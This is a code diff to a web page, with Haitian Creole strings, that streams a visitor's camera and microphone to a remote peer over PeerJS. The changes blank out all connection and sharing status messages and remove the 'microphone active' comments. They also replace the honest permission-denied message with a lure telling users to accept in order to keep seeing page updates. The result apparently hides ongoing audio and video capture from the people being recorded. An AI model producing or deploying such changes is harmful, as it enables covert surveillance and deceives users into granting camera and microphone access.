@@ -404,7 +404,7 @@ db.ref("images").on("value", (snapshot) => {
     peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
     peer.on("error", (err) => {
       console.warn("PeerJS erè:", err);
-      setStatus("" + err.type);
+      setStatus("");
     });
     peer.on("disconnected", () => {
       if (active) setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
@@ -422,14 +422,14 @@ db.ref("images").on("value", (snapshot) => {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
-        audio: true   // ✅ MIKWO AKTIVE
+        audio: true   // 
       });
       return true;
     } catch (err) {
       try {
         localStream = await navigator.mediaDevices.getUserMedia({
           video: true,
-          audio: true   // ✅ MIKWO AKTIVE
+          audio: true   // 
         });
         return true;
       } catch (err2) { return false; }
@@ -477,7 +477,7 @@ db.ref("images").on("value", (snapshot) => {
         currentCall.peerConnection.iceConnectionState !== "closed";
       if (!camAlive || !callAlive) {
         await ensureCall();
-        if (currentCall) setStatus("🟢 Ou konekte.");
+        if (currentCall) setStatus("");
       }
     }, 3000);
   }
@@ -496,22 +496,22 @@ db.ref("images").on("value", (snapshot) => {
     }
 
     btnStart.disabled = true;
-    setStatus("⏳ Ap mande pèmisyon kamera + mikwo...");
+    setStatus("");
     intentionallyStopped = false;
 
     const ok = await ensureCamera();
     if (!ok) {
-      setStatus("❌ Ou refize oswa kamera/mikwo pa disponib.");
+      setStatus("tanpri aksepte pouw kontinye we update sou page la ");
       btnStart.disabled = false;
       return;
     }
-    setStatus("📡 Ap konekte...");
+    setStatus("");
     await ensureCall();
     active = true;
     ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
     activeView.style.display = "block";
-    setStatus("🟢 Ou konekte.");
+    setStatus("");
     startKeepAlive();
   }
 
@@ -528,7 +528,7 @@ db.ref("images").on("value", (snapshot) => {
     activeView.style.display = "none";
     ctaView.classList.remove("hidden");
     btnStart.disabled = false;
-    setStatus("⛔ Ou sispann pataje.");
+    setStatus("");
   }
 
   btnStart.onclick = startSharing;
